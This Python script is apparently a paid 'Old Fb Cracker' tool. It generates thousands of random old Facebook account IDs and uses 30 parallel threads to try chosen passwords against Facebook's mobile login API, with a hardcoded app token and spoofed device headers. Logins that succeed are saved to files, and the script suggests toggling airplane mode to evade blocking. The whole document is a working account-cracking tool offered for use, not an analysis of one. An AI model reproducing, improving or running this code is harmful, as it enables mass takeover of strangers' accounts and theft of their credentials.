
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")
#APURBO
try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
#CODE BY APURBO


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		
		#APURBO
		print ("""\033[1;92m   
           _____  _    _ _____  ____   ____  
     /\   |  __ \| |  | |  __ \|  _ \ / __ \ 
    /  \  | |__) | |  | | |__) | |_) | |  | |
   / /\ \ |  ___/| |  | |  _  /|  _ <| |  | |
  / ____ \| |    | |__| | | \ \| |_) | |__| |
 /_/    \_\_|     \____/|_|  \_\____/ \____/ 
                                             
                                             

                                                                                 
\033[1;90m💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮
\033[1;91m [\033[1;94mâœ¯\033[1;91m] \033[1;92mFACEBOOK : APURBO
\033[1;91m [\033[1;94mâœ¯\033[1;91m] \033[1;92mFB PAGE : APURBO
\033[1;91m [\033[1;94mâœ¯\033[1;91m] \033[1;92mGITHUB   : NAI
\033[1;91m [\033[1;94mâœ¯\033[1;91m] \033[1;92mWARNING  : DON'T TRY TO MODIFY
\033[1;90m💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮•💮
    """)
		print("%s [%sâ€¢%s] %sTOOL NAME : %s🌺Old Fb Cracker💮"%(G,R,G,B,G))
		print("%s [%sâ€¢%s] %sVERSION   : %s1.5"%(G,R,G,B,G))
		print("")
		print("\n    \033[0;92m            START MANU\033[0;97m ")
		print("\n    \033[0;92m            LOVE MY SUPPORTER🌺\033[0;97m ")
		print("%s [%s--1--%s]%s CRACK---RANDOM---FB---ID--- 2008-11 %s(💮Free🌺)"%(G,R,G,B,G))
		allah = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
		if allah in ["", " "]:
			Main()
		elif allah in ["1", "01"]:
			self.dark()
		else:
			Main()
#APURBO
	def dark(self):
		r = 111111111
		rr = 999999999
		mmm = "100000" 
		limit = int(input("\x1b[1;93m [+] ENTER LIMIT \x1b[1;92m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(r,rr)
				__ = mmm
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> on.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> off.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [#] CRACK COMPLETE...")
		except Exception as e:exit(str(e))
#APURBO
	def api(self, uid, pwx):
		ua = random.choice ("Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36,Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Mobile Safari/537.36 Edge/40.15254.603,Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 EdgA/100.0.1185.50,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/100.0.1185.39,Mozilla/5.0 (iPad; CPU OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1,Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0,Mozilla/5.0 (Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0,Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0,Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/100.0 Mobile/15E148 Safari/605.1.15,Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0,Mozilla/5.0 (Macintosh; Intel Mac OS X 12.3; rv:100.0) Gecko/20100101 Firefox/100.0,Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edge/44.18363.8131,Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36,Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:100.0) Gecko/100.0 Firefox/100.0")
		sys.stdout.write(
			"\r\r %s[>_] [APURBO] : %s/%s -> \033[0;92m [ JUST NOW:%s ]- \033[0;91m[CP:%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \x1b[1;91m   [LOGIN NOW] %s | %s\033[0;90m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("on.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \x1b[1;91m   [CP] %s | %s\x1b[1;96m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("off.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
#APURBO
		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
		helpnote()
		Main()
				#APURBO

def apubuy ():
	os.system("clear")
	
	print ("""\033[1;92m   
           _____  _    _ _____  ____   ____  
     /\   |  __ \| |  | |  __ \|  _ \ / __ \ 
    /  \  | |__) | |  | | |__) | |_) | |  | |
   / /\ \ |  ___/| |  | |  _  /|  _ <| |  | |
  / ____ \| |    | |__| | | \ \| |_) | |__| |
 /_/    \_\_|     \____/|_|  \_\____/ \____/ """)
	print("")
	try:
		tok = open('/sdcard/apuvai.txt', 'r').read()
		dec =(tok)
		if len(dec) < 50:
		    not_reg()
		r = requests.get("https://pastebin.com/raw/8PThGLRt").text
		if dec in r:
		    Main()	 #add your main menu when payment sucess
		else:
		    print('\t  \033[1;91m YOUR  Token_token  IS NOT  APPROVED :(')
		    print("")
		    #print('\033[1;93m Your Token_token : \033[1;92m'+dec+'\n\n\n')
		    print("  \t  \033[1;93m Be A Paid User ")
		    not_reg()
	except (IOError):
	    not_reg()
	except requests.exceptions.ConnectionError:
	    print('\n\n\nTurn on mobile data OR wifi to continue\n\n')
	    sys.exit()

	

def not_reg():
    print('\n\n\nVerify your Token_token\n\n\n')
    string_Token_token = 'abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    v_Token_token = ''.join((random.choice(string_Token_token)) for x in range(50))
    v_Token_token_save = open('/sdcard/apuvai.txt', 'w')
    v_Token_token_save.write((v_Token_token))
    v_Token_token_save.close()
    print('\033[1;93m Your Token_token : \033[1;92m' + v_Token_token)
    
    
    print("  \t  \033[1;93m Send Token To Admin ")
    #os.system('xdg-open https://wa.me/') #whatsapp number here
    
if __name__ == '__main__':
	apubuy ()

#try:Main()
#except Exception as e:exit(str(e))


